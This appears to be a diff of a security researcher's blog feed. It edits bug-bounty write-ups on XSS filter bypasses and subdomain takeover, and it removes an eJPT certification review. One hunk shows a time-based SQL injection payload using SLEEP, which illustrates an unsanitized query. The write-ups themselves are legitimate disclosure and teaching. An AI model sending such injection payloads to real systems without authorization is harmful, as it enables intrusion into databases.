-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web pentesting" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing hidden input tag and auto-submit script in a form.</summary></entry><entry><title type="html">Subdomain takeover via unclaimed Azure VM</title><link href="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/" rel="alternate" type="text/html" title="Subdomain takeover via unclaimed Azure VM" /><published>2023-11-13T00:00:00+01:00</published><updated>2023-11-13T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web pentesting" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="burpsuite" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing hidden input tag and auto-submit script in a form.</summary></entry><entry><title type="html">Subdomain takeover via unclaimed Azure VM</title><link href="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/" rel="alternate" type="text/html" title="Subdomain takeover via unclaimed Azure VM" /><published>2023-11-13T00:00:00+01:00</published><updated>2023-11-13T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/11/13/subdomain-takeover-via-unclaimed-azure-vm/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
@@ -2179,10 +2601,10 @@ prompt
   &lt;/button&gt;
 &lt;/div&gt;
 
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;HackCommander&apos; OR (SELECT SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HackCommander&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; OR (SELECT SLEEP(0.02))=1#
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;and &lt;strong&gt;the backend no sanitization is being applied in the input&lt;/strong&gt;, the query that will be executed is&lt;/p&gt;
+&lt;p&gt;and &lt;strong&gt;no input sanitization is being applied in the backend&lt;/strong&gt;, the query that will be executed is&lt;/p&gt;
 
 &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
@@ -2676,251 +3098,4 @@ alert(1)
   &lt;li&gt;Gau and kxss are very useful tools for bug bounty. They are very easy to install and run and, in return, can give several URLs potentially vulnerable to XSS.&lt;/li&gt;
   &lt;li&gt;Although a sanitization algorithm may seem safe at first, it may not be. Given a sanitization like the one we have seen in this post it is a good exercise to think about what algorithms you would have used to perform such sanitization because some of them may be the one being used on the website. If any of the algorithms you have thought of is vulnerable, the payloads to exploit these vulnerabilities are candidate payloads to use against the website.&lt;/li&gt;
   &lt;li&gt;Bug bounty is not a CTF, is the jungle. Many times even if a vulnerability is present, you will have to fight with WAFs and sanitizations so you need to be prepared to think outside the box.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web pentesting" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="xss" /><category term="python" /><category term="bypass" /><category term="sanitization" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.</summary></entry><entry><title type="html">eJPT certification review</title><link href="https://hackcommander.github.io/posts/2022/09/01/ejpt-certification-review/" rel="alternate" type="text/html" title="eJPT certification review" /><published>2022-09-01T00:00:00+02:00</published><updated>2022-09-01T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2022/09/01/ejpt-certification-review</id><content type="html" xml:base="https://hackcommander.github.io/posts/2022/09/01/ejpt-certification-review/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. What is eJPT?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. What will you learn and what previous knowledge do you need?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Is it useful for the curriculum?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Is it affordable?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. How is the content?&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-5-1&quot;&gt;5.1. Penetration Testing Prerequisites&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-5-2&quot;&gt;5.2. Penetration Testing: Preliminary Skills &amp;amp; Programming&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-5-3&quot;&gt;5.3. Penetration Testing Basics&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-5-4&quot;&gt;5.4. eJPT Exam Preparation&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-6&quot;&gt;6. How is the exam?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-7&quot;&gt;7. Conclusions&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-logo.png&quot; alt=&quot;Logo&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In this post I am going to review the eLearnSecurity Junior Penetration Tester certification, better known as eJPT.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-1&quot; /&gt;
-
-&lt;h2 id=&quot;1-what-is-ejpt&quot;&gt;1. What is eJPT?&lt;/h2&gt;
-
-&lt;p&gt;We can consider eLearnSecurity Junior Penetration Tester (eJPT) certification as the first of multiples certs that the company eLearnSecurity offers to the IT professionals to begin their career in cybersecurity. The course covers the fundamentals about networking devices and protocols, web applications, programming and operative systems, all this from the point of view of offensive security, i.e., studying the most common types of attacks that you can perform. You can see the details in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://elearnsecurity.com/product/ejpt-certification/&quot;&gt;eJPT index&lt;/a&gt;&lt;/p&gt;
-
-&lt;div id=&quot;section-id-2&quot; /&gt;
-
-&lt;h2 id=&quot;2-what-will-you-learn-and-what-previous-knowledge-do-you-need&quot;&gt;2. What will you learn and what previous knowledge do you need?&lt;/h2&gt;
-
-&lt;p&gt;If you click on the above link, you will see that the topics you will learn are&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TCP/IP.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;IP routing.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;LAN protocols and devices.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;HTTP and web technologies.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Essential penetration testing processes and methodologies.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Basic vulnerability assessment of networks.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Basic vulnerability assessment of web applications.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Exploitation with Metasploit.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Simple web application manual exploitation.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Basic information gathering and reconnaissance.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Simple scanning and profiling the target.&lt;br /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;and I can assure you that it is absolutely correct. As you can see the words &lt;strong&gt;“basic”&lt;/strong&gt; and &lt;strong&gt;“simple”&lt;/strong&gt; appears a lot and that is important, eJPT is not an advanced certification, it is a beginner certification but you will learn a lot of useful recon and hacking techniques.&lt;/p&gt;
-
-&lt;p&gt;Also as you can see in the link above, you can see the following prerequisites&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Deep understanding of networking concepts.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Simple manual web application security assessment and exploitation.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Basic vulnerability assessment of networks.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Using Metasploit for performing simple attacks.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Web application manual exploitation through attack vectors.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Ability to perform protocol analysis of a traffic capture.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Understanding of information gathering techniques.&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;Understanding of the penetration testing process.&lt;br /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;and I have to say that I don’t agree with it. The link says that the above prerequisites could help you to pass the exam, and that is true, but that long prerequisites list might scare you. If you don’t know what a PC is, probably you will have problems taking the course and passing the exam but if you have a basic knowledge about computers and you are determined and motivated to learn, you will not have any problem.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-3&quot; /&gt;
-
-&lt;h2 id=&quot;3-is-it-useful-for-the-curriculum&quot;&gt;3. Is it useful for the curriculum?&lt;/h2&gt;
-
-&lt;p&gt;First of all, I would like to say that I don’t recommend to anyone to get into a certification process only to get a nice small piece of paper to impress the RRHH team. However, I am not a hater of certifications, I think that certs (good certs) are a very good way to start studying cybersecurity in a solid and structured way.&lt;/p&gt;
-
-&lt;p&gt;Taking into account the above statement, I think that eJPT could be a &lt;strong&gt;very good cover letter&lt;/strong&gt; for IT professionals who want to get his first job in cybersecurity and to aspire to obtain other more advanced certifications like OSCP. If you are a senior pentester or if you have more advanced certifications such as OSCP, eJPT is probably not the best option for you.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-4&quot; /&gt;
-
-&lt;h2 id=&quot;4-is-it-affordable&quot;&gt;4. Is it affordable?&lt;/h2&gt;
-
-&lt;p&gt;The course is free and is provided by INE in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student&quot;&gt;eJPT course&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;but before you have to create a free account in the following link&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://checkout.ine.com/starter-pass&quot;&gt;Free INE subscription&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The price of the voucher is 200$ but I bought it for 100$ during a 50% off promotion on all certifications during July 2022. The voucher includes 1 free retake and a 6 months period time to begin the certification process. It is important to note that you don’t need to buy the voucher to have access to the course so you can take a look at the course and then decide if you want to buy the voucher and start the certification process.&lt;/p&gt;
-
-&lt;p&gt;In my opinion, considering the free course, the price of the voucher and the possibility of taking the voucher with a discount, the free retake… I think that eJPT is a &lt;strong&gt;very affordable certification&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;:warning: Be careful with the name you use during the registration process on the INE website because that is the name that it will appear on the certificate of completion and you will not be able to change it on your own. In my case, I used only my name and my first surname so I had to contact to INE support to add my second surname to the profile and to the certificate of completion. I had to open several tickets and it took more than a month to make the change so I recommend that when you create the account you do it with the name you want to appear on your certificate of completion.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div id=&quot;section-id-5&quot; /&gt;
-
-&lt;h2 id=&quot;5-how-is-the-content&quot;&gt;5. How is the content?&lt;/h2&gt;
-
-&lt;p&gt;The duration of the course is about 50 hours and it took me approximately three weeks to study all the content. I have to say that, although this is my first certification, it isn’t my first contact with cybersecurity. Before passing the eJPT, I already had some experience in offensive cybersecurity as I had already participated in platforms like HackTheBox and TryHackMe, and I had some experience as a Bug Bounty Hunter doing Web Pentesting, topic on which I am going to start publishing posts very soon. At this point, I would like to recommend the TryHackMe Jr Penetration Tester Learning Path&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe Jr Penetration Tester Learning Path&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;In this learning path you will learn and practice many of the topics that are present in the eJPT content, so it’s a good idea to take this learning path before taking the eJPT, but it isn’t neccesary. The goal of this section isn’t to explain all the details about the course but I think that is a good idea to divide the section in points, one point for each course module.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-5-1&quot; /&gt;
-
-&lt;h3 id=&quot;51-penetration-testing-prerequisites&quot;&gt;5.1. Penetration Testing Prerequisites&lt;/h3&gt;
-
-&lt;p&gt;In this module you will learn:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The basics of networking devices, such as what a router is and the differences between a switch and a hub.&lt;/li&gt;
-  &lt;li&gt;The basics of networking protocols such DNS, ARP, TCP and UDP…&lt;/li&gt;
-  &lt;li&gt;The basics of web applications, cookies, sessions, SOP, differences between HTTP and HTTPS…&lt;/li&gt;
-  &lt;li&gt;The basics of important tools such Wireshark and Burpsuite.&lt;/li&gt;
-  &lt;li&gt;A non-technical introduction to what pentesting is.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Although this module may seem very naive, I recommend you to study it, even if you already have previous knowledge of the subject matter . For example, I had medium previous knowledge about web pentesting but it was very useful for me to refresh some concepts about cookies and to see in practice the differences between HTTP and HTTPS. I knew that the main difference is data sent through HTTP is sent in clear text and data sent through HTTP is sent encrypted with TLS but I had never seen the difference in practice capturing traffic with wireshark.&lt;/p&gt;
-
-&lt;p&gt;At this point, I would like to comment that the labs of all the modules are very interesting but sometimes the statements are not very clear, so dont be afraid to take a look to the solution if you are stuck and you don’t know what you are being asked to do.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;:warning: Pay special attention to the lab &lt;strong&gt;Find the Secret Server&lt;/strong&gt;. Its seems very simple and naive, and it is, but I advise to you to understand very well all the concepts of this lab because it could be very useful for you in the exam.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div id=&quot;section-id-5-2&quot; /&gt;
-
-&lt;h3 id=&quot;52-penetration-testing-preliminary-skills--programming&quot;&gt;5.2. Penetration Testing: Preliminary Skills &amp;amp; Programming&lt;/h3&gt;
-
-&lt;p&gt;In this module you will learn:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;What programming is.&lt;/li&gt;
-  &lt;li&gt;The basics of a low-level programming language, such as C++.&lt;/li&gt;
-  &lt;li&gt;The basics of a high-level programming language, such as Python.&lt;/li&gt;
-  &lt;li&gt;The basics of some command line scripting languages, such as Bash for Linux and CMD and Powershell for Windows.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Probably this is the least important of all the modules because you don’t need to learn to program in C++ or Python to pass the exam but I think that it is a very important module if you want to improve as a pentester. In my opinion, it is very important to have a solid knowledge about programming to understand the main types of vulnerabilities and so you don’t turn into a script kiddie who only knows how to exploit vulnerabilities with metasploit. Also knowing about programming will give you the possibility to develop your own pentesting tools that you can share with the community.&lt;/p&gt;
-
-&lt;p&gt;However, the section about Bash, CMD and Powershell it is very important, you need those languages to communicate with the operating systems in a non-graphical way. In fact you will need Bash to use in an optimal way your Linux Distribution to do pentesting, in my case Kali Linux, and to be able to launch the pentesting tools that you will see in this course.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-5-3&quot; /&gt;
-
-&lt;h3 id=&quot;53-penetration-testing-basics&quot;&gt;5.3. Penetration Testing Basics&lt;/h3&gt;
-
-&lt;p&gt;In this module you will learn:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;A set of techniques to perform information gathering about the target.&lt;/li&gt;
-  &lt;li&gt;A set of techniques to perform discovering, scanning, footprinting… using tools such as Nmap.&lt;/li&gt;
-  &lt;li&gt;The basics of vulnerabilty assessment with Nessus.&lt;/li&gt;
-  &lt;li&gt;Different techniques to perform different kind of attacks in web applications, systems and in a network enviroment.&lt;/li&gt;
-  &lt;li&gt;The basics of pivoting and port forwarding.&lt;/li&gt;
-  &lt;li&gt;The use of the most basic tools of exploitation such as Arpspoof, Metasploit, Msfvenom, Xsser, Sqlmap, Burpsuite, John the Ripper, Hashcat…&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Probably this is the core module of the course and, without a doubt, the one I enjoyed the most. Because of I made before the TryHackMe Jr Penetration Tester Learning Path and because of my experience as a Bug Bounty Hunter, there were a lot of topics and tools that I already knew but it was a good refresh. However, I learn new techniques such as how to perform a Man In The Middle Attack (MITM). Probably my weak point was network attacks, so I learned a lot in this sense.&lt;/p&gt;
-
-&lt;p&gt;Also, at the end of the module you will be able to practice the techniques learned during the course with 3 black-boxes. I advise you to pay special attention to these boxes and learn how to exploit RCE vulnerabilities on services like V-CMS and Werkzeug and learn about famous exploits like EternalBlue.&lt;/p&gt;
-
-&lt;p&gt;I only have 2 complaints about this module:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Buffer Overflow is in the module but it is not explained how can be exploited and there isn’t an associated lab. I would have loved to see some more info about this vulnerability.&lt;/li&gt;
-  &lt;li&gt;Pivoting and port forwarding techniques are not explained during the course. You will see directly these techniques in the blackboxes so if you don’t know anything about that, you will have to take a look to the solution to see how is done with Metasploit, Meterpreter, Proxychains…&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div id=&quot;section-id-5-4&quot; /&gt;
-
-&lt;h3 id=&quot;54-ejpt-exam-preparation&quot;&gt;5.4. eJPT Exam Preparation&lt;/h3&gt;
-
-&lt;p&gt;In this module you will learn:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Nothing new :laughing:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Essentially in this module you will see how to begin the certification process, i.e, how to connect to your exam enviroment. There are two labs but I don’t understand the reason for its existence, you will not learn anything new with that labs.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-6&quot; /&gt;
-
-&lt;h2 id=&quot;6-how-is-the-exam&quot;&gt;6. How is the exam?&lt;/h2&gt;
-
-&lt;p&gt;To begin the exam you have to log in Caendra and click on &lt;strong&gt;“Begin certification process”&lt;/strong&gt;. After that you will receive a pcap file, a list of user names, a list of passwords and a ovpn file to connect to the exam enviroment. If the name of the ovpn file is ovpn_file.ovpn, I advise to you to use the following command to connect to the enviroment&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo openvpn --config ovpn_file.ovpn --daemon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;to run the ovpn file a as daemon, in the background.&lt;/p&gt;
-
-&lt;p&gt;Then you should read all 20 questions before answering any questions and after that… the fun begins! First of all you will have to analyze the pcap looking for credentials, routers, servers, clients… interesting traffic in general. If you have difficulties in analyzing the pcap, I recommend you use the following pcap file analyzer&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://apackets.com/&quot;&gt;Pcap file analyzer tool&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;but ideally you should be able to analyze it manually.&lt;/p&gt;
-
-&lt;p&gt;To answer the question you will have to use discovery and scanning techniques with Nmap, web pentesting tools like Burpsuite, Dirb or Sqlmap, exploiting tools like Metasploit, John the Ripper…&lt;/p&gt;
-
-&lt;p&gt;In my opinion the machines in the exam are much easier than the most difficult machines of the course so don’t be afraid of failing the exam: if you have made the labs and you have understood it, you will pass the exam.&lt;/p&gt;
-
-&lt;p&gt;It took me approximately 10 hours to answer all the questions but since I had plenty of time (the duration of the exam is 72 hours), I took the rest of the day off and waited until the next day to check and submit the answers. I answered all 20 questions correctly, as you can see in the following capture&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-results.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;although you only have to asnwer correctly 15 questions to pass the exam and failures don’t penalize.&lt;/p&gt;
-
-&lt;p&gt;Finally, when you pass the exam you will get a nice certificate of completion as follows&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-09-01-ejpt-certification-review/ejpt-certificate.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;and a link to attach in your linkedin profile&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://verified.elearnsecurity.com/certificates/b38d8ae2-8290-4f92-af3b-2e99336f5f4e&quot;&gt;Link to my eJPT certificate&lt;/a&gt;&lt;/p&gt;
-
-&lt;div id=&quot;section-id-7&quot; /&gt;
-
-&lt;h2 id=&quot;7-conclusions&quot;&gt;7. Conclusions&lt;/h2&gt;
-
-&lt;p&gt;From all that we have seen we can say that the eJPT is a certification with the pros and cons:&lt;/p&gt;
-
-&lt;h3 id=&quot;pros&quot;&gt;&lt;u&gt;Pros&lt;/u&gt;:&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Beginner friendly.&lt;/li&gt;
-  &lt;li&gt;Very good content structure.&lt;/li&gt;
-  &lt;li&gt;Affordable price.&lt;/li&gt;
-  &lt;li&gt;Useful for the curriculum.&lt;/li&gt;
-  &lt;li&gt;Funny and not difficult exam.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;cons&quot;&gt;&lt;u&gt;Cons&lt;/u&gt;:&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;You can’t download the videos and the slides in pdf.&lt;/li&gt;
-  &lt;li&gt;Sometimes the statements of the labs are not clear, so don’t be afraid to take a look to the solution if you are stuck and you don’t know what you are being asked to do.&lt;/li&gt;
-  &lt;li&gt;Part of the content is studied directly in the labs, such as pivoting and port forwarding. I think that is not good because you could waste a lot of time trying to solve the lab thinking that you have the necessary skills, but you don’t have them.&lt;/li&gt;
-  &lt;li&gt;Not very good technical support from INE. As I mentioned in section 4, something as simple as changing the name of my INE profile was a very time consuming process.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Despite the cons, I think that the eJPT certification is a &lt;strong&gt;highly recommended&lt;/strong&gt; cert for anyone interested in starting a career in the world of offensive security.&lt;/p&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="certification" /><category term="elearnsecurity" /><category term="ejpt" /><category term="pentesting" /><summary type="html">Review of the eJPT (eLearnSecurity Junior Penetration Tester), certification of eLearnSecurity intended for students interested in obtaining the necessary training that a junior pentester should have.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web pentesting" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="burpsuite" /><category term="gau" /><category term="kxss" /><category term="xss" /><category term="python" /><category term="bypass" /><category term="sanitization" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing HTML tag removal sanitization.</summary></entry></feed>
